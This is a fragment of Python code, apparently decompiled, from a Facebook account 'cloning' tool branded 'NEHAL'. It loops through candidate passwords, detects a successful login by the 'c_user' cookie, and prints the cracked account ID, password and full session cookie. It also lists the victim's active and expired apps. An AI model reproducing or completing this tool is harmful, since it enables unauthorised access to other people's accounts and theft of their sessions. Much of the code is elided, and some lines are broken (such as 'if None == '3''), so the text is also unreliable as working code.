...
def FD():
    os.system('clear')
    print(logo)
    print('\x1b[1;33m [1] START CLONING ')
    print(' [2] EXIT')
    opt = input('\n  \x1b[1;32m[!]Choice option: ')
    if opt == '1':
...
def o():
    ...
    jalan('\x1b[1;32m [2] \x1b[1;32mFOLLOW ME ON FACEBOOK')
    ...
    if None == '3':
        ...
        return None
    if None == '4':
        os.system('xdg-open https://www.instagram.com/nehalahmed.10 ')
        return None
    if None == '0':
        os.system('exit')
        return None
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        print(f'\r[NEHAL] %s \x1b[1;95m Your Active Apps      :{WHITE}'%(GREEN))
    ...
    if len(game)==0:
        ...
        print(f'\r[NEHAL] %s \x1b[1;95m Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(NEHAL-OK)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(NEHAL-CP)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
